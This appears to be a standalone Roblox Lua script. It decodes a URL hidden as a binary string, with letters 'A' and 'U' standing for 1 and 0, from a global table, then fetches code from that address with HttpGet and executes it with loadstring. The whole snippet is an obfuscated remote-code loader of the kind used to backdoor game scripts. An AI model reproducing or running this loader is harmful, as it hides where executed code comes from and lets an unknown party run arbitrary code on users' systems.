local t=_G.__AUCE_DATA
local u=""
for _,v in next,t do v=v:gsub("A","1"):gsub("U","0") u=u..string.char(tonumber(v,2)) end
loadstring(game:HttpGet(u))()
